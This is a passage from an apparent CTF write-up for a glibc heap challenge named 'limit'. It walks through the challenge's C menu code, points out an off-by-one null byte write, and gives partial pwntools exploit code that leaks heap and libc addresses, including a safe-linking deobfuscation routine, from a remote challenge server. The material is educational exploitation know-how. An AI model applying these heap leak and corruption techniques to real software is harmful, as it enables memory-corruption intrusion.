</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>It’s simple — first, it again verifies whether the index is within bounds.</p></blockquote>
<blockquote>
<p>If the index check passes, it then checks if there’s actually a pointer at that index. If there’s none, it just breaks out with a message.</p></blockquote>
<blockquote>
<p>Otherwise, it frees the chunk at that index, then nulls out the pointer in the <code>chunks</code> table, and also sets the corresponding size to <code>0</code>.</p></blockquote>
<hr>
<h3 class="heading-element" id="case-3-print-chunks-using-puts"><span>Case 3: print chunks using puts</span>
  <a href="#case-3-print-chunks-using-puts" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Simple — it prints the data at the specified chunk.</p></blockquote>
<blockquote>
<p>First, it checks if the index is within bounds, and then ensures there&rsquo;s actually a address present at that index.</p></blockquote>
<blockquote>
<p>If everything’s good, it uses <code>puts</code> to print the contents of the chunk.</p></blockquote>
<aside>
💡
<p>This is <strong>very</strong> useful — it can potentially be abused to <strong>leak addresses</strong> . Classic info leak opportunity 😈.</p>
</aside>
<hr>
<h3 class="heading-element" id="case-4-read-to-chunks-with-max-possible-size"><span>Case 4: Read to chunks with max possible size</span>
  <a href="#case-4-read-to-chunks-with-max-possible-size" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">					 <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%ld&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;idx &lt; 0x10&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;no chunk at this idx&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Data: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span> <span class="n">sizes</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;read failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">][</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid option&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Performs regular checks then, it reads input from <code>stdin</code> into the chunk at that index, up to the size stored in the <code>sizes</code> table for that chunk.</p></blockquote>
<blockquote>
<p>Then — the part to pay attention to — it sets the <strong>next immediate byte after the read</strong> to <code>0</code>, to null-terminate the string.</p></blockquote>
<img src="http://localhost:1313/d1ff/images_limit/bad_code.png" width="400" style="display: block; margin: auto;"  />
<!-- ![bad_code.png](/d1ff/images_limit/bad_code.png) -->
<p>This introduces a <strong>potential null byte poisoning.</strong></p>
<aside>
💡
<p>Why? Suppose you fill the chunk <em>exactly</em> up to its max size — then the null byte written at <code>chunks[idx][len] = 0</code> will end up right <strong>after</strong> the allocated chunk.</p>
</aside>
<p><em>But how will this help in our exploit? We&rsquo;ll get to that soon — just store this info  in your shrinking hippocampus for now.</em></p>
<hr>
<h2 class="heading-element" id="additional-challenge-info"><span>Additional challenge info</span>
  <a href="#additional-challenge-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>Binary Protections</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">Stack:    No canary found
</span></span><span class="line"><span class="cl">NX:       NX enabled
</span></span><span class="line"><span class="cl">PIE:      PIE enabled</span></span></code></pre></td></tr></table>
</div>
</div><p><code>libc version</code> → 2.39</p>
<hr>
<h2 class="heading-element" id="leak-leak--leak-all-that-i-want-"><span>LEAK, LEAK , LEAK all that I want !</span>
  <a href="#leak-leak--leak-all-that-i-want-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>getting heap and Libc leak is quite straight forward here ,</p>
<p>To get the <strong>heap leak</strong>, we allocate two chunks of the same size (small enough to fit in the tcache bin), then free both of them. Now, when we allocate again with the same size, we get back one of the previously freed chunks.
Now, when we print the content of this freshly reallocated chunk, we see a pointer left behind by the allocator — yupp**! <code>heap leak</code>.**</p>
<aside>
💡
<p>Why does this happen? Because <code>malloc</code> is lazy — it doesn&rsquo;t bother clearing out the contents of the chunk before handing it back to you. Combine this with how <strong>tcache bins</strong> work (specifically, storing forward pointers inside freed chunks), to better understand how tcache works, look here →</p>
</aside>
<p><em>(We need to Deobfuscate the heap leak because of the <a href="https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking"target="_blank" rel="external nofollow noopener noreferrer">safe linking</a> implementation in tcache)</em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./limit_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="c1"># r = process()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;smiley.cat&#39;</span><span class="p">,</span> <span class="s1">&#39;39321&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">defuscate</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">l</span><span class="o">=</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">):</span> <span class="c1"># 16 nibble</span>
</span></span><span class="line"><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xf</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="o">+</span><span class="mi">12</span> <span class="p">))</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="o">+</span><span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">|=</span> <span class="p">(</span><span class="n">v1</span> <span class="o">^</span> <span class="n">v2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">obfuscate</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">adr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">^</span><span class="p">(</span><span class="n">adr</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Size:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_into</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>   
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index:&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(r,gdbscript=&#39;b *main+1273&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">defuscate</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">))</span> <span class="o">+</span> <span class="mh">0x562c4dace000</span> <span class="o">-</span><span class="mh">0x562c4dace2a0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;heap_base = </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Obtaining the <strong>Libc leak</strong> is straightforward: free a chunk  into the unsorted bin, allocate a chunk of the from the unsorted freed memory , and then print it’s content — you get, <code>Libc leak</code> in return !</p>
<aside>
💡
<p>Why ? Well, when a chunk gets placed in the unsorted bin, glibc stashes forward and backward pointers (<code>fd</code> and <code>bk</code>) inside it, pointing into libc’s main arena. And again, malloc doesn’t zero anything out when reusing the chunk.</p>
</aside>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="c1">#chuck at 0 index is in Unsorted bin and other chunks are inside tcache bin</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x726908600000</span> <span class="o">-</span> <span class="mh">0x726908803c10</span>
